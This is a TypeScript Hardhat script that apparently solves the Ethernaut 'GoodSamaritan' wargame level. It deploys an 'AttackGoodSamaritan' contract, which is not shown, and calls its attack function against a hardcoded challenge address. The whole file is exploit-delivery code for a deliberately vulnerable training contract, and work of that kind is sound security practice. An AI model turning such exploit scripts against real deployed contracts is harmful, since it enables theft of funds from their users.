import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackGoodSamaritan = async () => {
    // change contract addresses here.
    const goodSamaritanAddress = "0x063380A0ba27e70539Bb1873dCFc82C47583a040"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from
    // additional read:
    // https://blog.soliditylang.org/2021/04/21/custom-errors/
    // https://docs.openzeppelin.com/contracts/3.x/extending-contracts#rules_of_hooks
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackGoodSamaritan", args);
    // alternative below
    console.log("Deploying attack contract AttackGoodSamaritan...");
    const Factory = await ethers.getContractFactory("AttackGoodSamaritan", deployer);
    const attackGoodSamaritan = await Factory.deploy();
    console.log(attackGoodSamaritan);
    console.log(`Contract deployed to ${attackGoodSamaritan.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (attackGoodSamaritan.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: attackGoodSamaritan.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    const attack = await ethers.getContractAt("AttackGoodSamaritan", attackGoodSamaritan.address);
    console.log("Sending attack using player's contract...");
    const tx = await attack.attack(goodSamaritanAddress);
};

attackGoodSamaritan()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
